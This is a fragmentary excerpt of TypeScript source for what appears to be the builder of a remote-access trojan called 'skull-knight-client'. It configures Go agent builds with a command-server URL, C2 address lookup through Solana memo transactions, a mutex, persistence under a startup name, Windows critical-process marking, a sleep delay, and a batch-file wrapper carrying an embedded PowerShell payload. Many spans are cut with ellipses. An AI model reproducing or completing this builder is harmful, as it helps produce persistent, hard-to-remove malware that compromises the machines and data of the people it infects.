...
function resolveClientModuleDir(rootDir: string): string | null {
  const candidates = [
    path.join(rootDir, "skull-knight-client"),
    path.join(rootDir, "..", "skull-knight-client"),
    path.join(rootDir, "dist", "skull-knight-client"),
    path.join(rootDir, "dist", "skull-knight-client", "skull-knight-client"),
  ];
...
function resolveClientBuildCacheRoot(): string {
  const explicit = process.env.SKULL_KNIGHT_CLIENT_BUILD_CACHE_DIR?.trim();
  if (explicit) {
...
export async function startBuildProcess(
  ...
  try {
    ...
    if (!clientDir) {
      throw new Error(
        `skull-knight-client source not found (missing go.mod). Checked: ${path.join(rootDir, "dist", "skull-knight-client")}, ${path.join(rootDir, "skull-knight-client")}`,
      );
    }
...
`;
    ...
    for (const platform of platformsToBuild) {
      ...
      if (config.serverUrl) {
        const serverFlag = `-X skull-knight-client/cmd/agent/config.DefaultServerURL=${config.serverUrl}`;
        ldflags = `${ldflags} ${serverFlag}`;
        sendToStream({ type: "output", text: `Server URL: ${config.serverUrl}\n`, level: "info" });
      }

      if (config.rawServerList) {
        const rawServerFlag = "-X skull-knight-client/cmd/agent/config.DefaultServerURLIsRaw=true";
        ldflags = ldflags ? `${ldflags} ${rawServerFlag}` : rawServerFlag;
        sendToStream({ type: "output", text: "Raw server list: enabled\n", level: "info" });
      }

      if (config.solMemo) {
        const solFlag = "-X skull-knight-client/cmd/agent/config.DefaultServerURLIsSol=true";
        ldflags = ldflags ? `${ldflags} ${solFlag}` : solFlag;
        sendToStream({ type: "output", text: "Solana memo lookup: enabled\n", level: "info" });

        if (config.solAddress) {
          const solAddrFlag = `-X skull-knight-client/cmd/agent/config.DefaultSolAddress=${config.solAddress}`;
          ldflags = `${ldflags} ${solAddrFlag}`;
          sendToStream({ type: "output", text: `Solana address: ${config.solAddress}\n`, level: "info" });
        }

        if (config.solRpcEndpoints) {
          const solRpcFlag = `-X skull-knight-client/cmd/agent/config.DefaultSolRPCEndpoints=${config.solRpcEndpoints}`;
      ...
      if (buildMutex) {
        const mutexFlag = `-X skull-knight-client/cmd/agent/config.DefaultMutex=${buildMutex}`;
        ldflags = ldflags ? `${ldflags} ${mutexFlag}` : mutexFlag;
      }

      if (config.enablePersistence) {
        if (!platform.startsWith('android-')) {
          const persistenceFlag = "-X skull-knight-client/cmd/agent/config.DefaultPersistence=true";
          ...
          if (config.startupName) {
            const startupNameFlag = `-X skull-knight-client/cmd/agent/persistence.DefaultStartupName=${config.startupName}`;
      ...
      if (buildAgentToken) {
        const agentTokenFlag = `-X skull-knight-client/cmd/agent/config.DefaultAgentToken=${buildAgentToken}`;
        ldflags = ldflags ? `${ldflags} ${agentTokenFlag}` : agentTokenFlag;
      }

      if (buildTag) {
        const buildTagFlag = `-X skull-knight-client/cmd/agent/config.DefaultBuildTag=${buildTag}`;
        ldflags = ldflags ? `${ldflags} ${buildTagFlag}` : buildTagFlag;
      }

      if (config.sleepSeconds && config.sleepSeconds > 0) {
        const sleepFlag = `-X skull-knight-client/cmd/agent/config.DefaultSleepSeconds=${config.sleepSeconds}`;
      ...
      if (config.criticalProcess && os === "windows") {
        const criticalFlag = "-X skull-knight-client/cmd/agent/config.DefaultCriticalProcess=true";
      ...
      try {
        ...
        if (isBatWrapper) {
          ...
          try {
            ...
            const marker = `:sk_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;
            // PowerShell payload: reads this script via %_sk_SELF%, strips the marker+data,
